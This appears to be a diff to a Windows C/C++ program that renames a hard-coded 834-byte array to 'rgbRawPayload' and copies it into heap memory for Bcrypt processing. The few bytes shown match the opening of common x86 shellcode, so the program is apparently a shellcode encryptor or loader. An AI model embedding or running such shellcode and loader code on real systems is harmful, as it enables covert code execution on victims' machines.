@@ -9,7 +9,7 @@
 
 #pragma comment(lib, "Bcrypt.lib")
 
-static const BYTE rgbRawData[834] = {
+static const BYTE rgbRawPayload[834] = {
     0xFC, 0xE8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xD2, 0x64,
     0x8B, 0x52, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28,
     0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C,
@@ -521,7 +521,7 @@ void main()
         goto Cleanup;
     }
 
-    cbRawData = sizeof(rgbRawData);
+    cbRawData = sizeof(rgbRawPayload);
     pbRawData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbRawData);
     if (nullptr == pbRawData)
     {
@@ -529,7 +529,7 @@ void main()
         goto Cleanup;
     }
 
-    memcpy(pbRawData, rgbRawData, sizeof(rgbRawData));
+    memcpy(pbRawData, rgbRawPayload, sizeof(rgbRawPayload));
 
     //
     // Get the output buffer size.
